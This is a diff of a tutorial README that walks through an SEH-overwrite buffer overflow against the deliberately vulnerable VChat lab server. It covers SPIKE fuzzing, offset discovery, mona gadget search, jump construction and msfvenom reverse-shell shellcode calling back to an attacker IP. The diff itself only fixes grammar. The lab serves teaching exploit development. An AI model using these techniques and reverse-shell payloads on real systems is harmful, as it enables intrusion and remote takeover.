@@ -1,14 +1,14 @@
 # VChat GMON Exploit: Structure Exception Handling
 
-*Notice*: The following exploit, and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-gmon/)
+*Notice*: The following exploit and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-gmon/)
 ___
 
 Not all buffer overflows will be capable of directly overflowing the return address to modify the `eip` register in order to gain control of the flow of execution. So how do we account for this? When exploiting a Windows system we can use the [Structured Exception Handling](https://learn.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170) (SEH) feature provided that allows for languages like C to have a common exception handling paradigm, the try-catch-finally block.
 
 
-**Notice**: Please setup the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
+**Notice**: Please set up the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
 ## SEH
-SEH is an exception handling procedure used to process possibly fatal exceptions, that is SEH is used to examine, and respond to some event raised by the program in the same scope, or some external but related scope. Exceptions could be a failure during a systemcall due to the resources being unavailable, some runtime error, or even simple arithmetic errors such as a divide by zero exception. The features provided by SEH on a Windows system allow us to create a chain of exception handlers in C or C++ programs that can process an exception before it reaches the default handler. The entire SEH process is thread specific, so it is possible for multiple threads within the same process to have different SEH chains to handle the exceptions unique to each executing thread. We can define a basic set of handler by using the try-catch-finally block as shown below.
+SEH is an exception handling procedure used to process possibly fatal exceptions, that is SEH is used to examine, and respond to some event raised by the program in the same scope, or some external but related scope. Exceptions could be a failure during a system call due to the resources being unavailable, some runtime error, or even simple arithmetic errors such as a divide by zero exception. The features provided by SEH on a Windows system allow us to create a chain of exception handlers in C or C++ programs that can process an exception before it reaches the default handler. The entire SEH process is thread-specific, so it is possible for multiple threads within the same process to have different SEH chains to handle the exceptions unique to each executing thread. We can define a basic set of handlers by using the try-catch-finally block, as shown below.
 
 ```
 int main()
@@ -25,7 +25,7 @@ int main()
     return 0;
 }
 ```
-* `__try`: If the code located within a **__try** block raises an exception (C++ or non-C++ Exception), if a paired **__except** block matches the raised exception it will be executed. Otherwise the exception is propagated.
+* `__try`: If the code located within a **__try** block raises an exception (C++ or non-C++ Exception), if a paired **__except** block matches the raised exception it will be executed. Otherwise, the exception is propagated.
 * `__except`: This is a exception handler, we may define the types of exception this block handles. When a paired **__try** block raises an exception, it it matches those defined for the **__except** block it will be executed.
 
 Each SEH entry or *record* is stored on the stack of the thread in a linked list format and contains two pointers one to the next entry in the SEH chain the other a pointer to an exception handler. The default handler is signified with the value `0xFFFFFFFF`, and if no other handlers are found to process the raised exception while traversing the chain, the default handed will eventually be invoked. Below is the structure used to define a SEH entry: 
@@ -42,11 +42,11 @@ typedef struct _EXCEPTION_REGISTRATION_RECORD
 As these entries are stored on the stack, if our overflow is positioned in such a way, it is possible for us to overflow the SEH entry on the stack, so if we were to raise an exception we could gain control of the flow of execution in the process even if we cannot successfully overflow the return address. 
 
 ## Exploitation
-The following sections cover the process that should (Or may) be followed when performing this exploitation on the VChat application. It should be noted, that the [**Dynamic Analysis**](#dynamic-analysis) section makes certain assumption primarily that we have access to the binary that may not be realistic however the enumeration and exploitation of generic Windows, and Linux servers in order to procure this falls out of the scope of this document.
+The following sections cover the process that should (Or may) be followed when performing this exploitation on the VChat application. It should be noted that the [**Dynamic Analysis**](#dynamic-analysis) section makes certain assumptions, primarily that we have access to the binary, which may not be realistic. However, the enumeration and exploitation of generic Windows and Linux servers in order to procure this falls out of the scope of this document.
 
 ### PreExploitation
 1. **Windows**: Setup VChat
-   1. Compile VChat and it's dependencies if they has not already been compiled. This is done with mingw.
+   1. Compile VChat and its dependencies if they have not already been compiled. This is done with mingw.
       1. Create the essfunc object File.
 		```powershell
 		# Compile Essfunc Object file 
@@ -54,7 +54,7 @@ The following sections cover the process that should (Or may) be followed when p
 		```
       2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.   
 		```powershell
-		# Create a the DLL with a static (preferred) base address of 0x62500000
+		# Create a DLL with a static (preferred) base address of 0x62500000
 		$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
 		```
          * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux. 
@@ -102,13 +102,13 @@ The following sections cover the process that should (Or may) be followed when p
 	* Now, trying every possible combinations of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process as discussed later in the exploitation section.
 
 ### Dynamic Analysis 
-If you disabled exceptions for the [EggHunting](https://github.com/DaintyJet/VChat_GTER_EggHunter) exploit, that is we passed all exceptions through the debugger to the VChat process. You should uncheck the options so Immunity Debugger can catch the exceptions allowing us to see the state of the program at a crash. See step 2 of the [Launch VChat](#launch-vchat) section!
+If you disabled exceptions for the [EggHunting](https://github.com/DaintyJet/VChat_GTER_EggHunter) exploit, that is we passed all exceptions through the debugger to the VChat process. You should uncheck the options so Immunity Debugger can catch the exceptions, allowing us to see the state of the program at a crash. See step 2 of the [Launch VChat](#launch-vchat) section!
 #### Launch VChat
 1. Open Immunity Debugger
 
 	<img src="Images/I1.png" width=800> 
 
-    * Note that you may need to launch it as an *Administrator* this is done by right clicking the icon found in the Windows search bar or on the desktop as shown below:
+    * Note that you may need to launch it as an *Administrator* this is done by right-clicking the icon found in the Windows search bar or on the desktop as shown below:
 			
 	<img src="Images/I1b.png" width = 200>
 
@@ -117,7 +117,7 @@ If you disabled exceptions for the [EggHunting](https://github.com/DaintyJet/VCh
 
 	   <img src="Images/I1c.png" width = 200>
 
-   2. Open the Exception Options, if nothing is showing select any other tab and then re-select Exceptions 
+   2. Open the Exception Options, if nothing is showing, select any other tab and then re-select Exceptions 
 
 	   <img src="Images/I1d.png" width = 200>
 
@@ -126,7 +126,7 @@ If you disabled exceptions for the [EggHunting](https://github.com/DaintyJet/VCh
 	   <img src="Images/I1e.png" width = 200>
 
 
-3. Attach VChat: There are Two options! 
+3. Attach VChat: There are two options! 
    1. When the VChat is already Running 
         1. Click File -> Attach
 
@@ -145,7 +145,7 @@ If you disabled exceptions for the [EggHunting](https://github.com/DaintyJet/VCh
 
 			<img src="Images/I3-2.png" width=800>
 
-        3. Notice that a Terminal was opened when you clicked "Open" Now you should see the program output
+        3. Notice that a Terminal was opened when you clicked "Open" now you should see the program output
 
 			<img src="Images/I3-3.png" width=800>
 4. Ensure that the execution in not paused, click the red arrow (Top Left)
@@ -158,19 +158,19 @@ If you disabled exceptions for the [EggHunting](https://github.com/DaintyJet/VCh
 
    <img src="Images/S1.png" width=800> 
 
-   * This information is discovered by looking the the Processes Thread Environment Block (TEB).  
+   * This information is discovered by looking at the Processes Thread Environment Block (TEB).  
 
 3. Examine the SEH chain of the program
 
    <img src="Images/S2.png" width=800> 
 
-   * We can see there are two entries, we may want to keep an eye on these as we Fuzz the VChat server!
+   * We can see there are two entries. We may want to keep an eye on these as we Fuzz the VChat server!
 
 #### Fuzzing 
 SPIKE is a C based fuzzing tool that is commonly used by professionals, it is available in [kali linux](https://www.kali.org/tools/spike/) and other [pen-testing platforms](https://www.blackarch.org/fuzzer.html) and repositories. We should note that the original reference page appears to have been taken over by a slot machine site at the time of this writing, so you should refer to the [original writeup](http://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html) of the SPIKE tool by vulnserver's author [Stephen Bradshaw](http://thegreycorner.com/) in addition to [other resources](https://samsclass.info/127/proj/p18-spike.htm) for guidance. The source code is still available on [GitHub](https://github.com/guilhermeferreira/spikepp/) and still maintained on [GitLab](https://gitlab.com/kalilinux/packages/spike).
 
 1. Open a terminal on the **Kali Linux Machine**.
-2. Create a file ```GMON.spk``` file with your favorite text editor. We will be using a SPIKE script and interpreter rather than writing our own C based fuzzer. We will be using the [mousepad](https://github.com/codebrainz/mousepad) text editor in this walkthrough though any editor may be used.
+2. Create a file ```GMON.spk``` file with your favorite text editor. We will be using a SPIKE script and interpreter rather than writing our own C based fuzzer. We will be using the [mousepad](https://github.com/codebrainz/mousepad) text editor in this walkthrough, though any editor may be used.
 	```sh
 	$ mousepad GMON.spk
 	```
@@ -218,11 +218,11 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I5.png" width=800>
 
-	* After capturing the packets, right click a TCP stream and click follow! This allows us to see all of the output.
+	* After capturing the packets, right-click a TCP stream and click follow! This allows us to see all of the output.
 
 		<img src="Images/I6.png" width=400>
 
-8. However even though the return address does not change, by observing the SEH records we can see there has been a change there!
+8. However, even though the return address does not change, by observing the SEH records, we can see there has been a change there!
 
 	<img src="Images/I6b.png" width=400>
 
@@ -236,11 +236,11 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I9.png" width=600> 
 
-3. Notice that the EIP register reads `77C06819` and remains unchanged, but we can in this case see that the SEH record's handler was overwritten with `386D4537`. We can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the address offset based on our search string's position in the pattern we sent to VChat. 
+3. Notice that the EIP register reads `77C06819` and remains unchanged, but we can, in this case, see that the SEH record's handler was overwritten with `386D4537`. We can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the address offset based on our search string's position in the pattern we sent to VChat. 
 	```
 	$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386D4537
 	```
-	* This will return an offset as shown below; In this case the offset is `3503`
+	* This will return an offset as shown below; In this case, the offset is `3503`
 
 	<img src="Images/I10.png" width=600> 
 
@@ -250,14 +250,14 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 		<img src="Images/I11.png" width=600> 
 
 		* See that the SEH handler is a series of the value `42` that is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the program when an exception occurs.
-		* Note: Sometimes it took a few runs for this to work and update on the Immunity debugger.
+		* Note: Sometimes, it took a few runs for this to work and update on the Immunity debugger.
 5. Now let's pass the exception to the program and see what happens, we can use the keybind `Shift+F7` to do this (This should be displayed at the bottom of the screen).
 
 	<img src="Images/I12.png" width=600>
 
-      * We can see that the the `ESP` register (Containing the stack pointer) holds the address of `00F4EDC8`, however our buffer starts at `00F4EDD0`, which means we need to traverse 8 bytes before we reach a segment of the stack we control.
+      * We can see that the `ESP` register (Containing the stack pointer) holds the address of `00F4EDC8`, however, our buffer starts at `00F4EDD0`, which means we need to traverse 8 bytes before we reach a segment of the stack we control.
 
-6. We can use the fact that our extra data is on the stack to our advantage, and `pop` the extra data off into some register. The exact register does not really matter as we simply want to remove extra data from the stack. We can use `mona.py` to find a SEH gadget that pops the two extra elements off the stack (8-bytes), which places the stack pointer `ESP` in the correct position for us to start executing the code we will inject into our buffer; Use the command `!mona seh -cp nonull -cm safeseh=off -o` in Immunity Debugger as shown below.
+6. We can use the fact that our extra data is on the stack to our advantage and `pop` the extra data off into some register. The exact register does not really matter as we simply want to remove extra data from the stack. We can use `mona.py` to find a SEH gadget that pops the two extra elements off the stack (8-bytes), which places the stack pointer `ESP` in the correct position for us to start executing the code we will inject into our buffer; Use the command `!mona seh -cp nonull -cm safeseh=off -o` in Immunity Debugger as shown below.
 
 	<img src="Images/I13.png" width=600>
 
@@ -268,7 +268,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I14.png" width=600>
 
-      * We can see there are quite a number of options, any one of them should work. For the examples we will be using the address `62501B5E`.
+      * We can see there are quite a number of options, any one of them should work. For the examples, we will use the address `62501B5E`.
 	  * *Note*: If you do not see any output it may be hidden behind the one of the Immunity Debugger windows, you can open the `log` view.
 
 7. Modify the exploit to reflect the [exploit3.py](./SourceCode/exploit3.py) script to verify that this SEH overwrite works.
@@ -276,7 +276,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 		<img src="Images/I16.png" width=600>
 
-   2. Set a breakpoint at the desired address (Right click).
+   2. Set a breakpoint at the desired address (right-click).
 
 		<img src="Images/I17.png" width=600>
 
@@ -299,13 +299,13 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 		<img src="Images/I20.png" width=600>
 
-8. Notice where we have jumped to? This is slightly off as we jumped to the the address in the first half of the SEH record!
+8. Notice where we have jumped to? This is slightly off as we jumped to the address in the first half of the SEH record!
 
 	<img src="Images/I21.png" width=600>
 
-   * This means we have `00AEFFFF - 00AEFFCC = 33` or a decimal vale of 51 bytes of space. This is much less than the `3503` before our SEH overwrite...
+   * This means we have `00AEFFFF - 00AEFFCC = 33` or a decimal value of 51 bytes of space. This is much less than the `3503` before our SEH overwrite...
 
-9. Now we want to perform a Short Jump to avoid overwriting the SEH block. A short jump instruction is only 2 bytes, and should give us enough space to perform a long jump to the start of the buffer. We should use the tool `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` to generate the machine code for this.
+9. Now, we want to perform a Short Jump to avoid overwriting the SEH block. A short jump instruction is only 2 bytes and should give us enough space to perform a long jump to the start of the buffer. We should use the tool `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` to generate the machine code for this.
    * Run `nasm_shell.rb`. *Note* that it's path may differ on different machines!
    * enter `jmp short +0xa` to perform a short jump of 10 bytes. 
 
@@ -316,7 +316,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I23.png" width=600>
 
-12. Now we can as was done in the GTER exploit perform a long jump to the start of the buffer! In this case the address of the starting point is `00DDF221` (This may vary!), and we can use this when providing Immunity Debugger an instruction to assemble so it can calculate the offset for us. 
+12. Now we can, as was done in the GTER exploit, perform a long jump to the start of the buffer! In this case the address of the starting point is `00DDF221` (This may vary!), and we can use this when providing Immunity Debugger an instruction to assemble so it can calculate the offset for us. 
 
    1. Select the address we performed the short jumped to and right click it, select the assemble option as shown below.
 
@@ -345,7 +345,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
       <img src="Images/I29.png" width=600>
 
-Now that we have all the necessary parts for the creation of a exploit we will add the shellcode to our payload and gain access to a reverse shell!
+Now that we have all the necessary parts for the creation of an exploit, we will add the shellcode to our payload and gain access to a reverse shell!
 ### Exploitation
 1. Now We will need to create a reverse shell we can include in the payload, this is a program that reaches out and makes a connection to the attacker's machine (or one they control) from target machine and provides a shell to the attacker. We can generate the shellcode with the following command. 
 	```
@@ -355,13 +355,13 @@ Now that we have all the necessary parts for the creation of a exploit we will a
       * `-p windows/shell_reverse_tcp`: Specify we are using the tcp reverse shell payload for Windows. 
 	  * `LHOST=10.0.2.15`: Specify the Listening Host's IP (IP of Attacker).
       * `LPORT=4444`: Specify the Listening port (Port Attacker Listens on).
-      * `EXITFUNC=thread`: Exit process, this is running as a seh based exploit.
+      * `EXITFUNC=thread`: Exit process, this is running as a seh-based exploit.
       * `-f python`: Format the output for use in a python program.
-      * `-v SHELL`: Specify SHELL variable.
+      * `-v SHELL`: Specify SHELL as the variable name.
       * `-b '\x00'`: Set bad characters.
 
 2. Create the byte array representing the shellcode as done in [exploit6.py](./SourceCode/exploit6.py). Remember this should be placed at the start of the buffer!
-3. Now lets see how the program reacts!
+3. Now, let's see how the program reacts!
    1. Observe the exploit hitting the `pop/pop/ret` gadget after passing the exception to the program.
 
 	   <img src="Images/I27.png" width=600>
